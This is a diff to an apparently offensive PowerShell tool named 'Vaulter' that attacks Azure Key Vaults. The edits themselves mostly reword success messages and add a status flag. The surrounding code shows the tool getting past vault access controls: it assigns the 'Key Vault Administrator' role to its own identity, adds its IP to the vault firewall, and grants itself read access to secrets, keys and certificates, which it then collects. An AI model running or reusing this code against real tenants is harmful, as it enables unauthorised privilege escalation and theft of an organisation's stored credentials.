@@ -644,7 +644,7 @@ function Vaulter{
             Write-Host "-------------------------------------------------------------------------------" -ForegroundColor Cyan
 
             if($($subpermission) -eq 'allowed only read'){
-                Write-Host "[!] youe Identity's permission is $($subpermission), Skip..."
+                Write-Host "[!] Your Identity's permission on This Subscription is $($subpermission), Skip..."
                 continue
             }
 
@@ -905,7 +905,7 @@ function Vaulter{
                                             }
                                             elseif($code -eq 403){
                                             Write-Host "[!]Identity has Permission on this KeyVault But Your ip Blocked by Policy, Trying bypass.." -ForegroundColor gray
-                                                
+                                                $y = $False
                                                 $permFW = Test-CanChangeKvFirewall -SubscriptionId $sub.SubscriptionId -HeadersARM $HeadersARM
                                                 if($permFW -eq 'Good'){
                                                         $AzureARMToken = GetAzureARMToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
@@ -915,21 +915,29 @@ function Vaulter{
                                                         write-host "[+]Bypassed, Can Modify Setting..." -ForegroundColor DarkGreen
                                                         try{
                                                             New-AzRoleAssignment -RoleDefinitionName "Key Vault Administrator" -ObjectId $MyOid -Scope $VaultID | Out-Null
-                                                            write-host "[+]'Key Vault Administrator' role has been successfully added to your identity."
+                                                            $y = $True
                                                         }
                                                         catch{
                                                             write-host "[-] Could Not added 'Key Vault Administrator' Role to your Identity.."
                                                             break
                                                         }
+                                                            if($y){
+                                                                write-host "[+]'Key Vault Administrator' role has been successfully added to your identity."
+                                                                $y= $False
+                                                            }
                                                         try{
                                                             Add-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP | Out-Null
-                                                            write-host "[+]your IP Address: $MyIp Added successfully to Network Rule"
+                                                            $y = $True
                                                         }
                                                         catch{
                                                             write-host "[-] Could Not added yout ip to Network Rule .."
                                                             break
                                                         }
-                                                            
+                                                            if($y){
+                                                                write-host "[+]your IP Address: $MyIp Added successfully to Network Rule"
+                                                                $y= $False
+                                                            }
+
                                                         if ($ClientID -and $ClientSecret -and $TenantID){
                                                             $VaultToken1 = GetVaultToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                                         }
@@ -1076,6 +1084,7 @@ function Vaulter{
                                                 }
                                             }
                                         } #end try..
+                                        $y = $False
                                         $AzureARMToken = GetAzureARMToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                         $GraphToken = GetGraphToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                         Connect-AzAccount -AccessToken $AzureARMToken -MicrosoftGraphAccessToken $GraphToken -AccountId 1 -SubscriptionId $($sub.SubscriptionId) | out-null
@@ -1084,12 +1093,12 @@ function Vaulter{
                                         }
                                         catch{
                                         }
+
                                         try{
                                             New-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP | out-null
                                         }
                                         catch{
                                         }                                        
-                                        
                                         if ($ClientID -and $ClientSecret -and $TenantID){
                                             $VaultToken1 = GetVaultToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                         }
@@ -1236,6 +1245,7 @@ function Vaulter{
                             Write-Host "[*]Identity has no Permission on this KeyVault,Trying bypass.." -ForegroundColor gray
                                 $roledefCheck = Test-CanChangeKvRoleAssigmnet -SubscriptionId $($sub.SubscriptionId) -HeadersARM $HeadersARM
                                 if($roledefCheck -eq 'Good'){
+                                    $y = $False
                                     $GraphToken = GetGraphToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                     $AzureARMToken = GetAzureARMToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                     Connect-AzAccount -AccessToken $AzureARMToken -MicrosoftGraphAccessToken $GraphToken -AccountId 1 -SubscriptionId $($sub.SubscriptionId) | out-null
@@ -1243,21 +1253,29 @@ function Vaulter{
                                     write-host "[+]Bypassed, Can Modify Setting..." -ForegroundColor DarkGreen                                    
                                     try{
                                         New-AzRoleAssignment -RoleDefinitionName "Key Vault Administrator" -ObjectId $MyOid -Scope $VaultID | out-null
-                                        write-host "[+]'Key Vault Administrator' role has been successfully added to your identity."
+                                        $y = $True
                                     }
                                     catch{
                                         write-host "[-] Could Not added 'Key Vault Administrator' Role to your Identity.."
                                         continue
                                     }
+                                        if($y){
+                                             write-host "[+]'Key Vault Administrator' role has been successfully added to your identity."
+                                             $y = $False
+                                        }
                                     
                                     try{
                                         Add-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP | Out-Null
-                                        write-host "[+]your IP Address: $MyIp Added successfully to Network Rule"
+                                        $y = $True
                                     }
                                     catch{
                                         write-host "[-] Could Not added yout ip to Network Rule .."
                                         continue
                                     }
+                                        if($y){
+                                            write-host "[+]your IP Address: $MyIp Added successfully to Network Rule"
+                                            $y = $False
+                                        }
                                     if ($ClientID -and $ClientSecret -and $TenantID){
                                         $VaultToken1 = GetVaultToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                     }
@@ -1439,7 +1457,7 @@ function Vaulter{
                                             'Accept' = "application/json"
                                             'User-Agent'    = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
                                         }
-
+                                        
                                         $GraphToken = GetGraphToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                         $AzureARMToken = GetAzureARMToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                         Connect-AzAccount -AccessToken $AzureARMToken -MicrosoftGraphAccessToken $GraphToken -AccountId 1 -SubscriptionId $($sub.SubscriptionId) | out-null
@@ -1580,6 +1598,7 @@ function Vaulter{
                                         $APCheck = Test-CanModifyAccessPolicy -SubscriptionId  $($sub.SubscriptionId) -HeadersARM $HeadersARM
 
                                         if($APCheck -eq 'Good'){
+                                            $y = $false
                                             $GraphToken = GetGraphToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                             $AzureARMToken = GetAzureARMToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                             Connect-AzAccount -AccessToken $AzureARMToken -MicrosoftGraphAccessToken $GraphToken -AccountId 1 -SubscriptionId $($sub.SubscriptionId) | out-null
@@ -1588,20 +1607,26 @@ function Vaulter{
 
                                             try{
                                                 Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ResourceGroupName $ResourceGroup -ObjectId $MyOid -PermissionsToSecrets Get, List -PermissionsToKeys Get, List -PermissionsToCertificates Get, List | Out-Null
-                                                write-host "[+]Added full permissions for your itentity"
+                                                $y = $True
                                             }
                                             catch{
                                                 write-host "[-] Could Not added 'Key Vault Administrator' Role to your Identity.."
                                             }
-                                            write-host "[!]Trying to Addyour ip: $($myIP) to Network Rule .."
+                                                if($y){
+                                                    write-host "[+]Added full permissions to your Itentity"
+                                                    $y = $False
+                                                }
                                             try{
                                                 Add-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP | Out-Null
-                                                write-host "[+]your ip  seccesully added to Network Rule "
+                                                $y = $True
                                             }
                                             catch{
                                                 write-host "[-] Could Not added yout ip to Network Rule .."
                                             }                                        
-
+                                                if($y){
+                                                    write-host "[+]your IP Address: $MyIp added successfully to Network Rule"
+                                                    $y = $False
+                                                }
 
                                             if ($ClientID -and $ClientSecret -and $TenantID){
                                                 $VaultToken1 = GetVaultToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
@@ -1754,6 +1779,7 @@ function Vaulter{
                                     $APCheck = Test-CanModifyAccessPolicy -SubscriptionId  $($sub.SubscriptionId) -HeadersARM $HeadersARM
 
                                     if($APCheck -eq 'Good'){
+                                        $y = $false
                                         $GraphToken = GetGraphToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                         $AzureARMToken = GetAzureARMToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                         Connect-AzAccount -AccessToken $($AzureARMToken) -MicrosoftGraphAccessToken $($GraphToken) -AccountId 1 -SubscriptionId $($sub.SubscriptionId) | out-null
@@ -1762,19 +1788,27 @@ function Vaulter{
                                     
                                         try{
                                             Set-AzKeyVaultAccessPolicy -VaultName $($vaultName) -ResourceGroupName $($ResourceGroup) -ObjectId $($MyOid) -PermissionsToSecrets Get, List -PermissionsToKeys Get, List -PermissionsToCertificates Get, List | Out-Null
-                                            write-host "[+]Added full permissions to your Itentity"
+                                            $y = $True
                                         }
                                         catch{
                                             write-host "[-] Could Not chnaged permission,sorry"
                                         }
+                                            if($y){
+                                                write-host "[+]Added full permissions to your Itentity"
+                                                $y = $False
+                                            }
                                         
                                         try{
                                             Add-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP | Out-Null
-                                            write-host "[+]your IP Address: $MyIp added successfully to Network Rule"
+                                            $y = $True
                                         }
                                         catch{
                                             write-host "[-] Could Not added yout ip to Network Rule .."
-                                        }                                        
+                                        }    
+                                            if($y){
+                                                write-host "[+]your IP Address: $MyIp added successfully to Network Rule"
+                                                $y = $False
+                                            }                                    
 
                                         if ($ClientID -and $ClientSecret -and $TenantID){
                                             $VaultToken1 = GetVaultToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
@@ -2042,12 +2076,12 @@ $jsonEsc
   const keys    = data.filter(isKey);
   const certs   = data.filter(isCert);
 
-  
+  // עדכון מונים
   document.getElementById('countSecrets').textContent = `Secrets: ${secrets.length}`;
   document.getElementById('countKeys').textContent    = `Keys: ${keys.length}`;
   document.getElementById('countCerts').textContent   = `Certificates: ${certs.length}`;
 
-  
+  // Helperים
   const esc = s => (s ?? '').toString()
       .replace(/&/g,'&amp;').replace(/</g,'&lt;')
       .replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
@@ -2176,6 +2210,4 @@ function main{
 
 main
 }
-
-
 
